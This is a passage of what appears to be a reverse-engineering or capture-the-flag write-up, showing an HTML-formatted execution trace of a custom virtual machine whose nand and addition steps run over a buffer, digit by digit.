v2</span><br><span class="line">v8 = v1[116] (322)</span><br><span class="line">v12 = c</span><br><span class="line">v1[322] = v12 (-15)</span><br><span class="line">v14 = v1[321] (�)</span><br><span class="line">c = v14</span><br><span class="line">v14 = v1[323] (0)</span><br><span class="line">c = v14</span><br><span class="line">dword_6010A4 = -33 ; c = 48</span><br><span class="line">v14 = dword_6010A4 nand c</span><br><span class="line">c = v14</span><br><span class="line">v10 = c(-17)</span><br><span class="line">dword_6010A4 = v10</span><br><span class="line">v14 = v1[322] (�)</span><br><span class="line">c = v14</span><br><span class="line">dword_6010A4 = -17 ; c = -15</span><br><span class="line">v14 = dword_6010A4 nand c</span><br><span class="line">c = v14</span><br><span class="line">v7 = v2</span><br><span class="line">v8 = v1[139] (324)</span><br><span class="line">v12 = c</span><br><span class="line">v1[324] = v12 (30)</span><br><span class="line">v14 = v1[320] (.)</span><br><span class="line">c = v14</span><br><span class="line">v13 = v1[150] (46)</span><br><span class="line">c += v13</span><br><span class="line">v10 = c(287)</span><br><span class="line">dword_6010A4 = v10</span><br><span class="line">v14 = v1[324] ()</span><br><span class="line">c = v14</span><br><span class="line">v8 = dword_6010A4</span><br><span class="line">v12 = c</span><br><span class="line">v1[287] = v12 (30)</span><br><span class="line">v10 = v1[320] (46)</span><br><span class="line">dword_6010A4 = v10</span><br><span class="line">dword_6010A4++</span><br><span class="line">v12 = dword_6010A4</span><br><span class="line">v8 = v1[168] (320)</span><br><span class="line">v1[320] = v12 (47)</span><br><span class="line">v15 = &amp;v1[325] (17)</span><br><span class="line">--*v15</span><br><span class="line">v14 = v1[320] (/)</span><br><span class="line">c = v14</span><br><span class="line">v10 = c(47)</span><br><span class="line">dword_6010A4 = v10</span><br><span class="line">v13 = v1[92] (47)</span><br><span class="line">c += v13</span><br><span class="line">v6 = c</span><br><span class="line">v14 = v1[288] (0)</span><br><span class="line">c = v14</span><br><span class="line">v7 = v2</span><br><span class="line">v8 = v1[98] (323)</span><br><span class="line">v12 = c</span><br><span class="line">v1[323] = v12 (48)</span><br><span class="line">dword_6010A4 = 47 ; c = 48</span><br><span class="line">v14 = dword_6010A4 nand c</span><br><span class="line">c = v14</span><br><span class="line">v7 = v2</span><br><span class="line">v8 = v1[104] (321)</span><br><span class="line">v12 = c</span><br><span class="line">v1[321] = v12 (-33)</span><br><span class="line">v10 = c(-33)</span><br><span class="line">dword_6010A4 = v10</span><br><span class="line">v14 = v1[320] (/)</span><br><span class="line">c = v14</span><br><span class="line">dword_6010A4 = -33 ; c = 47</span><br><span class="line">v14 = dword_6010A4 nand c</span><br><span class="line">c = v14</span><br><span class="line">v7 = v2</span><br><span class="line">v8 = v1[116] (322)</span><br><span class="line">v12 = c</span><br><span class="line">v1[322] = v12 (-16)</span><br><span class="line">v14 = v1[321] (�)</span><br><span class="line">c = v14</span><br><span class="line">v14 = v1[323] (0)</span><br><span class="line">c = v14</span><br><span class="line">dword_6010A4 = -33 ; c = 48</span><br><span class="line">v14 = dword_6010A4 nand c</span><br><span class="line">c = v14</span><br><span class="line">v10 = c(-17)</span><br><span class="line">dword_6010A4 = v10</span><br><span class="line">v14 = v1[322] (�)</span><br><span class="line">c = v14</span><br><span class="line">dword_6010A4 = -17 ; c = -16</span><br><span class="line">v14 = dword_6010A4 nand c</span><br><span class="line">c = v14</span><br><span class="line">v7 = v2</span><br><span class="line">v8 = v1[139] (324)</span><br><span class="line">v12 = c</span><br><span class="line">v1[324] = v12 (31)</span><br><span class="line">v14 = v1[320] (/)</span><br><span class="line">c = v14</span><br><span class="line">v13 = v1[150] (47)</span><br><span class="line">c += v13</span><br><span class="line">v10 = c(288)</span><br><span class="line">dword_6010A4 = v10</span><br><span class="line">v14 = v1[324] ()</span><br><span class="line">c = v14</span><br><span class="line">v8 = dword_6010A4</span><br><span class="line">v12 = c</span><br><span class="line">v1[288] = v12 (31)</span><br><span class="line">v10 = v1[320] (47)</span><br><span class="line">dword_6010A4 = v10</span><br><span class="line">dword_6010A4++</span><br><span class="line">v12 = dword_6010A4</span><br><span class="line">v8 = v1[168] (320)</span><br><span class="line">v1[320] = v12 (48)</span><br><span class="line">v15 = &amp;v1[325] (16)</span><br><span class="line">--*v15</span><br><span class="line">v14 = v1[320] (0)</span><br><span class="line">c = v14</span><br><span class="line">v10 = c(48)</span><br><span class="line">dword_6010A4 = v10</span><br><span class="line">v13 = v1[92] (48)</span><br><span class="line">c += v13</span><br><span class="line">v6 = c</span><br><span class="line">v14 = v1[289] (0)</span><br><span class="line">c = v14</span><br><span class="line">v7 = v2</span><br><span class="line">v8 = v1[98] (323)</span><br><span class="line">v12 = c</span><br><span class="line">v1[323] = v12 (48)</span><br><span class="line">dword_6010A4 = 48 ; c = 48</span><br><span class="line">v14 = dword_6010A4 nand c</span><br><span class="line">c = v14</span><br><span class="line">v7 = v2</span><br><span class="line">v8 = v1[104] (321)</span><br><span class="line">v12 = c</span><br><span class="line">v1[321] = v12 (-49)</span><br><span class="line">v10 = c(-49)</span><br><span class="line">dword_6010A4 = v10</span><br><span class="line">v14 = v1[320] (0)</span><br><span class="line">c = v14</span><br><span class="line">dword_6010A4 = -49 ; c = 48</span><br><span class="line">v14 = dword_6010A4 nand c</span><br><span class="line">c = v14</span><br><span class="line">v7 = v2</span><br><span class="line">v8 = v1[116] (322)</span><br><span class="line">v12 = c</span><br><span class="line">v1[322] = v12 (-1)</span><br><span class="line">v14 = v1[321] (�)</span><br><span class="line">c = v14</span><br><span class="line">v14 = v1[323] (0)</span><br><span class="line">c = v14</span><br><span class="line">dword_6010A4 = -49 ; c = 48</span><br><span class="line">v14 = dword_6010A4 nand c</span><br><span class="line">c = v14</span><br><span class="line">v10 = c(-1)</span><br><span class="line">dword_6010A4 = v10</span><br><span class="line">v14 = v1[322] (�)</span><br><span class="line">c = v14</span><br><span class="line">dword_6010A4 = -1 ; c = -1</span><br><span class="line">v14 = dword_6010A4 nand c</span><br><span class="line">c = v14</span><br><span class="line">v7 = v2</span><br><span class="line">v8 = v1[139] (324)</span><br><span class="line">v12 = c</span><br><span class="line">v1[324] = v12 (0)</span><br><span class="line">v14 = v1[320] (0)</span><br><span class="line">c = v14</span><br><span class="line">v13 = v1[150] (48)</span><br><span class="line">c += v13</span><br><span class="line">v10 = c(289)</span><br><span class="line">dword_6010A4 = v10</span><br><span class="line">v14 = v1[324] ( )</span><br><span class="line">c = v14</span><br><span class="line">v8 = dword_6010A4</span><br><span class="line">v12 = c</span><br><span class="line">v1[289] = v12 (0)</span><br><span class="line">v10 = v1[320] (48)</span><br><span class="line">dword_6010A4 = v10</span><br><span class="line">dword_6010A4++</span><br><span class="line">v12 = dword_6010A4</span><br><span class="line">v8 = v1[168] (320)</span><br><span class="line">v1[320] = v12 (49)</span><br><span class="line">v15 = &amp;v1[325] (15)</span><br><span class="line">--*v15</span><br><span class="line">v14 = v1[320] (1)</span><br><span class="line">c = v14</span><br><span class="line">v10 = c(49)</span><br><span class="line">dword_6010A4 = v10</span><br><span class="line">v13 = v1[92] (49)</span><br><span class="line">c += v13</span><br><span class="line">v6 = c</span><br><span class="line">v14 = v1[290] (0)</span><br><span class="line">c = v14</span><br><span class="line">v7 = v2</span><br><span class="line">v8 = v1[98] (323)</span><br><span class="line">v12 = c</span><br><span class="line">v1[323] = v12 (48)</span><br><span class="line">dword_6010A4 = 49 ; c = 48</span><br><span class="line">v14 = dword_6010A4 nand c</span><br><span class="line">c = v14</span><br><span class="line">v7 = v2</span><br><span class="line">v8 = v1[104] (321)</span><br><span class="line">v12 = c</span><br><span class="line">v1[321] = v12 (-49)</span><br><span class="line">v10 = c(-49)</span><br><span class="line">dword_6010A4 = v10</span><br><span class="line">v14 = v1[320] (1)</span><br><span class="line">c = v14</span><br><span class="line">dword_6010A4 = -49 ; c = 49</span><br><span class="line">v14 = dword_6010A4 nand c</span><br><span class="line">c = v14</span><br><span class="line">v7 = v2</span><br><span class="line">v8 = v1[116] (322)</span><br><span class="line">v12 = c</span><br><span class="line">v1[322] = v12 (-2)</span><br><span class="line">v14 = v1[321] (�)</span><br><span class="line">c = v14</span><br><span class="line">v14 = v1[323] (0)</span><br><span class="line">c = v14</span><br><span class="line">dword_6010A4 = -49 ; c = 48</span><br><span class="line">v14 = dword_6010A4 nand c</span><br><span class="line">c = v14</span><br><span class="line">v10 = c(-1)</span><br><span class="line">dword_6010A4 = v10</span><br><span class="line">v14 = v1[322] (�)</span><br><span class="line">c = v14</span><br><span class="line">dword_6010A4 = -1 ; c = -2</span><br><span class="line">v14 = dword_6010A4 nand c</span><br><span class="line">c = v14</span><br><span class="line">v7 = v2</span><br><span class="line">v8 = v1[139] (324)</span><br><span class="line">v12 = c</span><br><span class="line">v1[324] = v12 (1)</span><br><span class="line">v14 = v1[320] (1)</span><br><span class="line">c = v14</span><br><span class="line">v13 = v1[150] (49)</span><br><span class="line">c += v13</span><br><span class="line">v10 = c(290)</span><br><span class="line">dword_6010A4 = v10</span><br><span class="line">v14 = v1[324] ()</span><br><span class="line">c = v14</span><br><span class="line">v8 = dword_6010A4</span><br><span class="line">v12 = c</span><br><span class="line">v1[290] = v12 (1)</span><br><span class="line">v10 = v1[320] (49)</span><br><span class="line">dword_6010A4 = v10</span><br><span class="line">dword_6010A4++</span><br><span class="line">v12 = dword_6010A4</span><br><span class="line">v8 = v1[168] (320)</span><br><span class="line">v1[320] = v12 (50)</span><br><span class="line">v15 = &amp;v1[325] (14)</span><br><span class="line">--*v15</span><br><span class="line">v14 = v1[320] (2)</span><br><span class="line">c = v14</span><br><span class="line">v10 = c(50)</span><br><span class="line">dword_6010A4 = v10</span><br><span class="line">v13 = v1[92] (50)</span><br><span class="line">c += v13</span><br><span class="line">v6 = c</span><br><span class="line">v14 = v1[291] (0)</span><br><span class="line">c = v14</span><br><span class="line">v7 = v2</span><br><span class="line">v8 = v1[98] (323)</span><br><span class="line">v12 = c</span><br><span class="line">v1[323] = v12 (48)</span><br><span class="line">dword_6010A4 = 50 ; c = 48</span><br><span class="line">v14 = dword_6010A4 nand c</span><br><span class="line">c = v14</span><br><span class="line">v7 = v2</span><br><span class="line">v8 = v1[104] (321)</span><br><span class="line">v12 = c</span><br><span class="line">v1[321] = v12 (-49)</span><br><span class="line">v10 = c(-49)</span><br><span class="line">dword_6010A4 = v10</span><br><span class="line">v14 = v1[320] (2)</span><br><span class="line">c = v14</span><br><span class="line">dword_6010A4 = -49 ; c = 50</span><br><span class="line">v14 = dword_6010A4 nand c</span><br><span class="line">c = v14</span><br><span class="line">v7 = v2</span><br><span class="line">v8 = v1[116] (322)</span><br><span class="line">v12 = c</span><br><span class="line">v1[322] = v12 (-3)</span><br><span class="line">v14 = v1[321] (�)</span><br><span class="line">c = v14</span><br><span class="line">v14 = v1[323] (0)</span><br><span class="line">c = v14</span><br><span class="line">dword_6010A4 = -49 ; c = 48</span><br><span class="line">v14 = dword_6010A4 nand c</span><br><span class="line">c = v14</span><br><span class="line">v10 = c(-1)</span><br><span class="line">dword_6010A4 = v10</span><br><span class="line">v14 = v1[322] (�)</span><br><span class="line">c = v14</span><br><span class="line">dword_6010A4 = -1 ; c = -3</span><br><span class="line">v14 = dword_6010A4 nand c</span><br><span class="line">c = v14</span><br><span class="line">v7 = v2</span><br><span class="line">v8 = v1[139] (324)</span><br><span class="line">v12 = c</span><br><span class="line">v1[324] = v12 (2)</span><br><span class="line">v14 = v1[320] (2)</span><br><span class="line">c = v14</span><br><span class="line">v13 = v1[150] (50)</span><br><span class="line">c += v13</span><br><span class="line">v10 = c(291)</span><br><span class="line">dword_6010A4 = v10</span><br><span class="line">v14 = v1[324] ()</span><br><span class="line">c = v14</span><br><span class="line">v8 = dword_6010A4</span><br><span class="line">v12 = c</span><br><span class="line">v1[291] = v12 (2)</span><br><span class="line">v10 = v1[320] (50)</span><br><span class="line">dword_6010A4 = v10</span><br><span class="line">dword_6010A4++</span><br><span class="line">v12 = dword_6010A4</span><br><span class="line">v8 = v1[168] (320)</span><br><span class="line">v1[320] = v12 (51)</span><br><span class="line">v15 = &amp;v1[325] (13)</span><br><span class="line">--*v15</span><br><span class="line">v14 = v1[320] (3)</span><br><span class="line">c = v14</span><br><span class="line">v10 = c(51)</span><br><span class="line">dword_6010A4 = v10</span><br><span class="line">v13 = v1[92] (51)</span><br><span class="line">c += v13</span><br><span class="line">v6 = c</span><br><span class="line">v14 = v1[292] (0)</span><br><span class="line">c = v14</span><br><span class="line">v7 = v2</span><br><span class="line">v8 = v1[98] (323)</span><br><span class="line">v12 = c</span><br><span class="line">v1[323] = v12 (48)</span><br><span class="line">dword_6010A4 = 51 ; c = 48</span><br><span class="line">v14 = dword_6010A4 nand c</span><br><span class="line">c = v14</span><br><span class="line">v7 = v2</span><br><span class="line">v8 = v1[104] (321)</span><br><span class="line">v12 = c</span><br><span class="line">v1[321] = v12 (-49)</span><br><span class="line">v10 = c(-49)</span><br><span class="line">dword_6010A4 = v10</span><br><span class="line">v14 = v1[320] (3)</span><br><span class="line">c = v14</span><br><span class="line">dword_6010A4 = -49 ; c = 51</span><br><span class="line">v14 = dword_6010A4 nand c</span><br><span class="line">c = v14</span><br><span class="line">v7 = v2</span><br><span class="line">v8 = v1[116] (322)</span><br><span class="line">v12 = c</span><br><span class="line">v1[322] = v12 (-4)</span><br><span class="line">v14 = v1[321] (�)</span><br><span class="line">c = v14</span><br><span class="line">v14 = v1[323] (0)</span><br><span class="line">c = v14</span><br><span class="line">dword_6010A4 = -49 ; c = 48</span><br><span class="line">v14 = dword_6010A4 nand c</span><br><span class="line">c = v14</span><br><span class="line">v10 = c(-1)</span><br><span class="line">dword_6010A4 = v10</span><br><span class="line">v14 = v1[322] (�)</span><br><span class="line">c = v14</span><br><span class="line">dword_6010A4 = -1 ; c = -4</span><br><span class="line">v14 = dword_6010A4 nand c</span><br><span class="line">c = v14</span><br><span class="line">v7 = v2</span><br><span class="line">v8 = v1[139] (324)</span><br><span class="line">v12 = c</span><br><span class="line">v1[324] = v12 (3)</span><br><span class="line">v14 = v1[320] (3)</span><br><span class="line">c = v14</span><br><span class="line">v13 = v1[150] (51)</span><br><span class="line">c += v13</span><br><span class="line">v10 = c(292)</span><br><span class="line">dword_6010A4 = v10</span><br><span class="line">v14 = v1[324] ()</span><br><span class="line">c = v14</span><br><span class="line">v8 = dword_6010A4</span><br><span class="line">v12 = c</span><br><span class="line">v1[292] = v12 (3)</span><br><span class="line">v10 = v1[320] (51)</span><br><span class="line">dword_6010A4 = v10</span><br><span class="line">dword_6010A4++</span><br><span class="line">v12 = dword_6010A4</span><br><span class="line">v8 = v1[168] (320)</span><br><span class="line">v1[320] = v12 (52)</span><br><span class="line">v15 = &amp;v1[325] (12)</span><br><span class="line">--*v15</span><br><span class="line">v14 = v1[320] (4)</span><br><span class="line">c = v14</span><br><span class="line">v10 = c(52)</span><br><span class="line">dword_6010A4 = v10</span><br><span class="line">v13 = v1[92] (52)</span><br><span class="line">c += v13</span><br><span class="line">v6 = c</span><br><span class="line">v14 = v1[293] (0)</span><br><span class="line">c = v14</span><br><span class="line">v7 = v2</span><br><span class="line">v8 = v1[98] (323)</span><br><span class="line">v12 = c</span><br><span class="line">v1[323] = v12 (48)</span><br><span class="line">dword_6010A4 = 52 ; c = 48</span><br><span class="line">v14 = dword_6010A4 nand c</span><br><span class="line">c = v14</span><br><span class="line">v7 = v2</span><br><span class="line">v8 = v1[104] (321)</span><br><span class="line">v12 = c</span><br><span class="line">v1[321] = v12 (-49)</span><br><span class="line">v10 = c(-49)</span><br><span class="line">dword_6010A4 = v10</span><br><span class="line">v14 = v1[320] (4)</span><br><span class="line">c = v14</span><br><span class="line">dword_6010A4 = -49 ; c = 52</span><br><span class="line">v14 = dword_6010A4 nand c</span><br><span class="line">c = v14</span><br><span class="line">v7 = v2</span><br><span class="line">v8 = v1[116] (322)</span><br><span class="line">v12 = c</span><br><span class="line">v1[322] = v12 (-5)</span><br><span class="line">v14 = v1[321] (�)</span><br><span class="line">c = v14</span><br><span class="line">v14 = v1[323] (0)</span><br><span class="line">c = v14</span><br><span class="line">dword_6010A4 = -49 ; c = 48</span><br><span class="line">v14 = dword_6010A4 nand c</span><br><span class="line">c = v14</span><br><span class="line">v10 = c(-1)</span><br><span class="line">dword_6010A4 = v10</span><br><span class="line">v14 = v1[322] (�)</span><br><span class="line">c = v14</span><br><span class="line">dword_6010A4 = -1 ; c = -5</span><br><span class="line">v14 = dword_6010A4 nand c</span><br><span class="line">c = v14</span><br><span class="line">v7 = v2</span><br><span class="line">v8 = v1[139] (324)</span><br><span class="line">v12 = c</span><br><span class="line">v1[324] = v12 (4)</span><br><span class="line">v14 = v1[320] (4)</span><br><span class="line">c = v14</span><br><span class="line">v13 = v1[150] (52)</span><br><span class="line">c += v13</span><br><span class="line">v10 = c(293)</span><br><span class="line">dword_6010A4 = v10</span><br><span class="line">v14 = v1[324] ()</span><br><span class="line">c = v14</span><br><span class="line">v8 = dword_6010A4</span><br><span class="line">v12 = c</span><br><span class="line">v1[293] = v12 (4)</span><br><span class="line">v10 = v1[320] (52)</span><br><span class="line">dword_6010A4 = v10</span><br><span class="line">dword_6010A4++</span><br><span class="line">v12 = dword_6010A4</span><br><span class="line">v8 = v1[168] (320)</span><br><span class="line">v1[320] = v12 (53)</span><br><span class="line">v15 = &amp;v1[325] (11)</span><br><span class="line">--*v15</span><br><span class="line">v14 = v1[320] (5)</span><br><span class="line">c = v14</span><br><span class="line">v10 = c(53)</span><br><span class="line">dword_6010A4 = v10</span><br><span class="line">v13 = v1[92] (53)</span><br><span class="line">c += v13</span><br><span class="line">v6 = c</span><br><span class="line">v14 = v1[294] (0)</span><br><span class="line">c = v14</span><br><span class="line">v7 = v2</span><br><span class="line">v8 = v1[98] (323)</span><br><span class="line">v12 = c</span><br><span class="line">v1[323] = v12 (48)</span><br><span class="line">dword_6010A4 = 53 ; c = 48</span><br><span class="line">v14 = dword_6010A4 nand c</span><br><span class="line">c = v14</span><br><span class="line">v7 = v2</span><br><span class="line">v8 = v1[104] (321)</span><br><span class="line">v12 = c</span><br><span class="line">v1[321] = v12 (-49)</span><br><span class="line">v10 = c(-49)</span><br><span class="line">dword_6010A4 = v10</span><br><span class="line">v14 = v1[320] (5)</span><br><span class="line">c = v14</span><br><span class="line">dword_6010A4 = -49 ; c = 53</span><br><span class="line">v14 = dword_6010A4 nand c</span><br><span class="line">c = v14</span><br><span class="line">v7 = v2</span><br><span class="line">v8 = v1[116] (322)</span><br><span class="line">v12 = c</span><br><span class="line">v1[322] = v12 (-6)</span><br><span class="line">v14 = v1[321] (�)</span><br><span class="line">c = v14</span><br><span class="line">v14 = v1[323] (0)</span><br><span class="line">c = v14</span><br><span class="line">dword_6010A4 = -49 ; c = 48</span><br><span class="line">v14 = dword_6010A4 nand c</span><br><span class="line">c = v14</span><br><span class="line">v10 = c(-1)</span><br><span class="line">dword_6010A4 = v10</span><br><span class="line">v14 = v1[322] (�)</span><br><span class="line">c = v14</span><br><span class="line">dword_6010A4 = -1 ; c = -6</span><br><span class="line">v14 = dword_6010A4 nand c</span><br><span class="line">c = v14</span><br><span class="line">v7 = v2</span><br><span class="line">v8 = v1[139] (324)</span><br><span class="line">v12 = c</span><br><span class="line">v1[324] = v12 (5)</span><br><span class="line">v14 = v1[320] (5)</span><br><span class="line">c = v14</span><br><span class="line">v13 = v1[150] (53)</span><br><span class="line">c += v13</span><br><span class="line">v10 = c(294)</span><br><span class="line">dword_6010A4 = v10</span><br><span class="line">v14 = v1[324] ()</span><br><span class="line">c = v14</span><br><span class="line">v8 = dword_6010A4</span><br><span class="line">v12 = c</span><br><span class="line">v1[294] = v12 (5)</span><br><span class="line">v10 = v1[320] (53)</span><br><span class="line">dword_6010A4 = v10</span><br><span class="line">dword_6010A4++</span><br><span class="line">v12 = dword_6010A4</span><br><span class="line">v8 = v1[168] (320)</span><br><span class="line">v1[320] = v12 (54)</span><br><span class="line">v15 = &amp;v1[325] (10)</span><br><span class="line">--*v15</span><br><span class="line">v14 = v1[320] (6)</span><br><span class="line">c = v14</span><br><span class="line">v10 = c(54)</span><br><span class="line">dword_6010A4 = v10</span><br><span class="line">v13 = v1[92] (54)</span><br><span class="line">c += v13</span><br><span class="line">v6 = c</span><br><span class="line">v14 = v1[295] (0)</span><br><span class="line">c = v14</span><br><span class="line">v7 = v2</span><br><span class="line">v8 = v1[98] (323)</span><br><span class="line">v12 = c</span><br><span class="line">v1[323] = v12 (48)</span><br><span class="line">dword_6010A4 = 54 ; c = 48</span><br><span class="line">v14 = dword_6010A4 nand c</span><br><span class="line">c = v14</span><br><span class="line">v7 = v2</span><br><span class="line">v8 = v1[104] (321)</span><br><span class="line">v12 = c</span><br><span class="line">v1[321] = v12 (-49)</span><br><span class="line">v10 = c(-49)</span><br><span class="line">dword_6010A4 = v10</span><br><span class="line">v14 = v1[320] (6)</span><br><span class="line">c = v14</span><br><span class="line">dword_6010A4 = -49 ; c = 54</span><br><span class="line">v14 = dword_6010A4 nand c</span><br><span class="line">c = v14</span><br><span class="line">v7 = v2</span><br><span class="line">v8 = v1[116] (322)</span><br><span class="line">v12 = c</span><br><span class="line">v1[322] = v12 (-7)</span><br><span class="line">v14 = v1[321] (�)</span><br><span class="line">c = v14</span><br><span class="line">v14 = v1[323] (0)</span><br><span class="line">c = v14</span><br><span class="line">dword_6010A4 = -49 ; c = 48</span><br><span class="line">v14 = dword_6010A4 nand c</span><br><span class="line">c = v14</span><br><span class="line">v10 = c(-1)</span><br><span class="line">dword_6010A4 = v10</span><br><span class="line">v14 = v1[322] (�)</span><br><span class="line">c = v14</span><br><span class="line">dword_6010A4 = -1 ; c = -7</span><br><span class="line">v14 = dword_6010A4 nand c</span><br><span class="line">c = v14</span><br><span class="line">v7 = v2</span><br><span class="line">v8 = v1[139] (324)</span><br><span class="line">v12 = c</span><br><span class="line">v1[324] = v12 (6)</span><br><span class="line">v14 = v1[320] (6)</span><br><span class="line">c = v14</span><br><span class="line">v13 = v1[150] (54)</span><br><span class="line">c += v13</span><br><span class="line">v10 = c(295)</span><br><span class="line">dword_6010A4 = v10</span><br><span class="line">v14 = v1[324] ()</span><br><span class="line">c = v14</span><br><span class="line">v8 = dword_6010A4</span><br><span class="line">v12 = c</span><br><span class="line">v1[295] = v12 (6)</span><br><span class="line">v10 = v1[320] (54)</span><br><span class="line">dword_6010A4 = v10</span><br><span class="line">dword_6010A4++</span><br><span class="line">v12 = dword_6010A4</span><br><span class="line">v8 = v1[168] (320)</span><br><span class="line">v1[320] = v12 (55)</span><br><span class="line">v15 = &amp;v1[325] (9)</span><br><span class="line">--*v15</span><br><span class="line">v14 = v1[320] (7)</span><br><span class="line">c = v14</span><br><span class="line">v10 = c(55)</span><br><span class="line">dword_6010A4 = v10</span><br><span class="line">v13 = v1[92] (55)</span><br><span class="line">c += v13</span><br><span class="line">v6 = c</span><br><span class="line">v14 = v1[296] (0)</span><br><span class="line">c = v14</span><br><span class="line">v7 = v2</span><br><span class="line">v8 = v1[98] (323)</span><br><span class="line">v12 = c</span><br><span class="line">v1[323] = v12 (48)</span><br><span class="line">dword_6010A4 = 55 ; c = 48</span><br><span class="line">v14 = dword_6010A4 nand c</span><br><span class="line">c = v14</span><br><span class="line">v7 = v2</span><br><span class="line">v8 = v1[104] (321)</span><br><span class="line">v12 = c</span><br><span class="line">v1[321] = v12 (-49)</span><br><span class="line">v10 = c(-49)</span><br><span class="line">dword_6010A4 = v10</span><br><span class="line">v14 = v1[320] (7)</span><br><span class="line">c = v14</span><br><span class="line">dword_6010A4 = -49 ; c = 55</span><br><span class="line">v14 = dword_6010A4 nand c</span><br><span class="line">c = v14</span><br><span class="line">v7 = v2</span><br><span class="line">v8 = v1[116] (322)</span><br><span class="line">v12 = c</span><br><span class="line">v1[322] = v12 (-8)</span><br><span class="line">v14 = v1[321] (�)</span><br><span class="line">c = v14</span><br><span class="line">v14 = v1[323] (0)</span><br><span class="line">c = v14</span><br><span class="line">dword_6010A4 = -49 ; c = 48</span><br><span class="line">v14 = dword_6010A4 nand c</span><br><span class="line">c = v14</span><br><span class="line">v10 = c(-1)</span><br><span class="line">dword_6010A4 = v10</span><br><span class="line">v14 = v1[322] (�)</span><br><span class="line">c = v14</span><br><span class="line">dword_6010A4 = -1 ; c = -8</span><br><span class="line">v14 = dword_6010A4 nand c</span><br><span class="line">c = v14</span><br><span class="line">v7 = v2</span><br><span class="line">v8 = v1[139] (324)</span><br><span class="line">v12 = c</span><br><span class="line">v1[324] = v12 (7)</span><br><span class="line">v14 = v1[320] (7)</span><br><span class="line">c = v14</span><br><span class="line">v13 = v1[150] (55)</span><br><span class="line">c += v13</span><br><span class="line">v10 = c(296)</span><br><span class="line">dword_6010A4 = v10</span><br><span class="line">v14 = v1[324] ()</span><br><span class="line">c = v14</span><br><span class="line">v8 = dword_6010A4</span><br><span class="line">v12 = c</span><br><span class="line">v1[296] = v12 (7)</span><br><span class="line">v10 = v1[320] (55)</span><br><span class="line">dword_6010A4 = v10</span><br><span class="line">dword_6010A4++</span><br><span class="line">v12 = dword_6010A4</span><br><span class="line">v8 = v1[168] (320)</span><br><span class="line">v1[320] = v12 (56)</span><br><span class="line">v15 = &amp;v1[325] (8)</span><br><span class="line">--*v15</span><br><span class="line">v14 = v1[320] (8)</span><br><span class="line">c = v14</span><br><span class="line">v10 = c(56)</span><br><span class="line">dword_6010A4 = v10</span><br><span class="line">v13 = v1[92] (56)</span><br><span class="line">c += v13</span><br><span class="line">v6 = c</span><br><span class="line">v14 = v1[297] (0)</span><br><span class="line">c = v14</span><br><span class="line">v7 = v2</span><br><span class="line">v8 = v1[98] (323)</span><br><span class="line">v12 = c</span><br><span class="line">v1[323] = v12 (48)</span><br><span class="line">dword_6010A4 = 56 ; c = 48</span><br><span class="line">v14 = dword_6010A4 nand c</span><br><span class="line">c = v14</span><br><span class="line">v7 = v2</span><br><span class="line">v8 = v1[104] (321)</span><br><span class="line">v12 = c</span><br><span class="line">v1[321] = v12 (-49)</span><br><span class="line">v10 = c(-49)</span><br><span class="line">dword_6010A4 = v10</span><br><span class="line">v14 = v1[320] (8)</span><br><span class="line">c = v14</span><br><span class="line">dword_6010A4 = -49 ; c = 56</span><br><span class="line">v14 = dword_6010A4 nand c</span><br><span class="line">c = v14</span><br><span class="line">v7 = v2</span><br><span class="line">v8 = v1[116] (322)</span><br><span class="line">v12 = c</span><br><span class="line">v1[322] = v12 (-9)</span><br><span class="line">v14 = v1[321] (�)</span><br><span class="line">c = v14</span><br><span class="line">v14 = v1[323] (0)</span><br><span class="line">c = v14</span><br><span class="line">dword_6010A4 = -49 ; c = 48</span><br><span class="line">v14 = dword_6010A4 nand c</span><br><span class="line">c = v14</span><br><span class="line">v10 = c(-1)</span><br><span class="line">dword_6010A4 = v10</span><br><span class="line">v14 = v1[322] (�)</span><br><span class="line">c = v14</span><br><span class="line">dword_6010A4 = -1 ; c = -9</span><br><span class="line">v14 = dword_6010A4 nand c</span><br><span class="line">c = v14</span><br><span class="line">v7 = v2</span><br><span class="line">v8 = v1[139] (324)</span><br><span class="line">v12 = c</span><br><span class="line">v1[324] = v12 (8)</span><br><span class="line">v14 = v1[320] (8)</span><br><span class="line">c = v14</span><br><span class="line">v13 = v1[150] (56)</span><br><span class="line">c += v13</span><br><span class="line">v10 = c(297)</span><br><span class="line">dword_6010A4 = v10</span><br><span class="line">v14 = v1[324] )</span><br><span class="line">c = v14</span><br><span class="line">v8 = dword_6010A4</span><br><span class="line">v12 = c</span><br><span class="line">v1[297] = v12 (8)</span><br><span class="line">v10 = v1[320] (56)</span><br><span class="line">dword_6010A4 = v10</span><br><span class="line">dword_6010A4++</span><br><span class="line">v12 = dword_6010A4</span><br><span class="line">v8 = v1[168] (320)</span><br><span class="line">v1[320] = v12 (57)</span><br><span class="line">v15 = &amp;v1[325] (7)</span><br><span class="line">--*v15</span><br><span class="line">v14 = v1[320] (9)</span><br><span class="line">c = v14</span><br><span class="line">v10 = c(57)</span><br><span class="line">dword_6010A4 = v10</span><br><span class="line">v13 = v1[92] (57)</span><br><span class="line">c += v13</span><br><span class="line">v6 = c</span><br><span class="line">v14 = v1[298] (0)</span><br><span class="line">c = v14</span><br><span class="line">v7 = v2</span><br><span class="line">v8 = v1[98] (323)</span><br><span class="line">v12 = c</span><br><span class="line">v1[323] = v12 (48)</span><br><span class="line">dword_6010A4 = 57 ; c = 48</span><br><span class="line">v14 = dword_6010A4 nand c</span><br><span class="line">c = v14</span><br><span class="line">v7 = v2</span><br><span class="line">v8 = v1[104] (321)</span><br><span class="line">v12 = c</span><br><span class="line">v1[321] = v12 (-49)</span><br><span class="line">v10 = c(-49)</span><br><span class="line">dword_6010A4 = v10</span><br><span class="line">v14 = v1[320] (9)</span><br><span class="line">c = v14</span><br><span class="line">dword_6010A4 = -49 ; c = 57</span><br><span class="line">v14 = dword_6010A4 nand c</span><br><span class="line">c = v14</span><br><span class="line">v7 = v2</span><br><span class="line">v8 = v1[116] (322)</span><br><span class="line">v12 = c</span><br><span class="line">v1[322] = v12 (-10)</span><br><span class="line">v14 = v1[321] (�)</span><br><span class="line">c = v14</span><br><span class="line">v14 = v1[323] (0)</span><br><span class="line">c = v14</span><br><span class="line">dword_6010A4 = -49 ; c = 48</span><br><span class="line">v14 = dword_6010A4 nand c</span><br><span class="line">c = v14</span><br><span class="line">v10 = c(-1)</span><br><span class="line">dword_6010A4 = v10</span><br><span class="line">v14 = v1[322] (�)</span><br><span class="line">c = v14</span><br><span class="line">dword_6010A4 = -1 ; c = -10</span><br><span class="line">v14 = dword_6010A4 nand c</span><br><span class="line">c = v14</span><br><span class="line">v7 = v2</span><br><span class="line">v8 = v1[139] (324)</span><br><span class="line">v12 = c</span><br><span class="line">v1[324] = 